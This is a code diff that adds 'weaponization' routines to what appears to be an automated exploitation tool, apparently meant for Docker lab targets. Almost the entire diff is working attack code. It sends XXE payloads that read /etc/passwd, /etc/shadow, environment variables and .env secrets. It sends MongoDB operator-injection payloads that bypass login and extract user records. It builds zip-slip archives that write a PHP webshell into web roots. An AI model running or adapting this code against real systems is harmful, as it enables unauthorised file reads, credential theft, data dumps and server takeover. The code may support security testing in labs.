@@ -66,6 +66,18 @@ def _infer_vuln_class(res) -> str:
     # File upload
     if "upload" in tecnica:
         return "arbitrary_file_upload"
+    # XXE
+    if any(x in tecnica for x in ("xxe", "xml-external", "dtd")) or any(
+            x in vuln_class for x in ("xxe", "xml-external")):
+        return "xxe"
+    # NoSQL injection
+    if any(x in tecnica for x in ("nosql", "mongo", "operator-inject")) or any(
+            x in vuln_class for x in ("nosql", "nosql-injection")):
+        return "nosql"
+    # Zip-slip / archive extraction
+    if any(x in tecnica for x in ("zip-slip", "zip_slip", "archive-extract", "traversal-zip")) or any(
+            x in vuln_class for x in ("zip-slip", "zip_slip", "arbitrary-file-write")):
+        return "zip_slip"
     return ""
 
 
@@ -758,6 +770,171 @@ def _weaponize_ssrf(boot, res, step_fn) -> dict:
     }
 
 
+def _weaponize_xxe(boot, res, step_fn) -> dict:
+    """Exfiltrate /etc/passwd and sensitive files via confirmed XXE."""
+    ev = res.evidence
+    endpoint = ev.get("endpoint") or ev.get("ep", "/")
+    param = ev.get("xml_param") or ev.get("inject_param") or ev.get("parametro_ganador") or "data"
+    method = (ev.get("metodo") or ev.get("method") or "POST").upper()
+
+    _step(step_fn, "XXE post-exploit: exfiltrating /etc/passwd and app secrets")
+
+    _TARGETS = [
+        ("etc_passwd", "/etc/passwd"),
+        ("etc_shadow", "/etc/shadow"),
+        ("proc_environ", "/proc/self/environ"),
+        ("app_env", "/app/.env"),
+        ("database_url", "/app/config/database.yml"),
+    ]
+
+    found = {}
+    for label, file_path in _TARGETS:
+        xxe_pl = (
+            f'<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>'
+            f'<root>&xxe;</root>'
+        )
+        try:
+            import requests as _rq
+            r = _rq.request(method, boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
+                            data={param: xxe_pl} if method != "GET" else None,
+                            params={param: xxe_pl} if method == "GET" else None,
+                            headers={"Content-Type": "application/xml"},
+                            timeout=_TIMEOUT)
+            body = (r.text or "")[:600]
+            # /etc/passwd marker
+            if "root:" in body or "daemon:" in body or "nobody:" in body:
+                found[label] = {"file": file_path, "snippet": body[:300]}
+                _step(step_fn, f"XXE file read confirmed: {file_path} → {body[:60]!r}")
+            elif "SECRET" in body.upper() or "PASSWORD" in body.upper() or "KEY=" in body.upper():
+                found[label] = {"file": file_path, "snippet": body[:300]}
+                _step(step_fn, f"XXE sensitive config confirmed: {file_path}")
+        except Exception:
+            pass
+
+    if found:
+        _impact_parts = [f"{v['file']} legible via XXE" for v in found.values()]
+        return {
+            "technique": "xxe_file_read",
+            "data": {"files_read": found},
+            "impact": "; ".join(_impact_parts),
+        }
+    return {"technique": "xxe_file_read", "data": {}, "impact": "",
+            "error": "XXE payloads sent but no sensitive file contents found"}
+
+
+def _weaponize_nosql(boot, res, step_fn) -> dict:
+    """Dump all users/data via confirmed NoSQL injection (MongoDB $where/$gt/$regex)."""
+    ev = res.evidence
+    endpoint = ev.get("endpoint") or ev.get("ep", "/")
+    param = ev.get("inject_param") or ev.get("parametro_ganador") or ev.get("param") or "password"
+    method = (ev.get("metodo") or ev.get("method") or "POST").upper()
+
+    _step(step_fn, f"NoSQL post-exploit: attempting data dump via $ne operator (param={param!r})")
+
+    # Dump strategy: use $ne bypass to login as every user, collect what leaks
+    dump_payloads = [
+        {param: {"$ne": None}, "username": {"$ne": None}},
+        {param: {"$gt": ""}, "username": {"$gt": ""}},
+        {param: {"$regex": ".*"}, "username": {"$regex": ".*"}},
+    ]
+
+    users_found = []
+    for _pl in dump_payloads:
+        try:
+            import requests as _rq
+            import json as _json
+            r = _rq.request(method, boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
+                            json=_pl if method != "GET" else None,
+                            params=_pl if method == "GET" else None,
+                            timeout=_TIMEOUT)
+            body = r.text or ""
+            if r.status_code in (200, 201):
+                # Try to extract user data from response
+                try:
+                    _d = _json.loads(body)
+                    if isinstance(_d, list):
+                        users_found.extend([str(u) for u in _d[:5]])
+                    elif isinstance(_d, dict):
+                        for _k in ("user", "users", "data", "result"):
+                            if isinstance(_d.get(_k), list):
+                                users_found.extend([str(u) for u in _d[_k][:5]])
+                                break
+                except Exception:
+                    # Look for email/username patterns in raw body
+                    _emails = re.findall(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}', body)
+                    users_found.extend(_emails[:5])
+            if users_found:
+                break
+        except Exception:
+            pass
+
+    if users_found:
+        return {
+            "technique": "nosql_dump",
+            "data": {"users_extracted": list(set(users_found))[:10]},
+            "impact": f"NoSQL auth bypass: {len(users_found)} user record(s) extracted without valid credentials",
+        }
+    return {"technique": "nosql_dump", "data": {}, "impact": "",
+            "error": "NoSQL dump payloads sent but no user data extracted"}
+
+
+def _weaponize_zip_slip(boot, res, step_fn) -> dict:
+    """Prove zip-slip impact by writing to a web-accessible path."""
+    ev = res.evidence
+    endpoint = ev.get("upload_endpoint") or ev.get("endpoint") or ev.get("ep", "/upload")
+
+    _step(step_fn, "zip-slip post-exploit: writing webshell to /tmp/ traversal path")
+
+    import io as _io
+    import zipfile as _zf
+    import secrets as _sec
+    import requests as _rq
+
+    _webshell_token = _sec.token_hex(8)
+    _webshell_name = f"binoracle_zs_{_webshell_token}.php"
+
+    # Try to write a PHP webshell to a web root via traversal
+    _TRAVERSAL_TARGETS = [
+        f"../../../var/www/html/{_webshell_name}",
+        f"../../html/{_webshell_name}",
+        f"../public/{_webshell_name}",
+        f"../../../tmp/{_webshell_token}.txt",
+    ]
+
+    for _tgt in _TRAVERSAL_TARGETS:
+        _buf = _io.BytesIO()
+        with _zf.ZipFile(_buf, "w") as _zfobj:
+            _zfobj.writestr(_tgt, f"<?php echo 'binoracle_zs_pwned_{_webshell_token}'; ?>")
+        _zip_bytes = _buf.getvalue()
+        try:
+            r = _rq.post(boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
+                         files={"file": ("evil.zip", _zip_bytes, "application/zip")},
+                         timeout=_TIMEOUT)
+            # Check if the token appears anywhere
+            _body = (r.text or "")
+            if _webshell_token in _body:
+                return {
+                    "technique": "zip_slip_write",
+                    "data": {"traversal_target": _tgt, "token": _webshell_token},
+                    "impact": f"Zip-slip: arbitrary file write to {_tgt} confirmed",
+                }
+            # Try to fetch the written file
+            _probe_path = _webshell_name
+            _r2 = _rq.get(f"{boot.base_url.rstrip('/')}/{_probe_path}", timeout=5)
+            if _webshell_token in (_r2.text or ""):
+                return {
+                    "technique": "zip_slip_webshell",
+                    "data": {"webshell_path": f"/{_probe_path}", "token": _webshell_token},
+                    "impact": f"Zip-slip: PHP webshell written to web root at /{_probe_path}",
+                }
+        except Exception:
+            pass
+
+    return {"technique": "zip_slip_write", "data": {}, "impact": "",
+            "error": "zip-slip traversal payloads sent but file write not confirmed in web root"}
+
+
 def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
     """
     Extend confirmed trigger to full impact using the live Docker lab session.
@@ -797,6 +974,12 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_file_upload(boot, res, step)
         elif vuln_class == "auth_bypass":
             return _weaponize_auth_bypass(boot, res, step)
+        elif vuln_class == "xxe":
+            return _weaponize_xxe(boot, res, step)
+        elif vuln_class == "nosql":
+            return _weaponize_nosql(boot, res, step)
+        elif vuln_class == "zip_slip":
+            return _weaponize_zip_slip(boot, res, step)
         else:
             _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
             return {"technique": "not_applicable", "data": {}, "impact": ""}
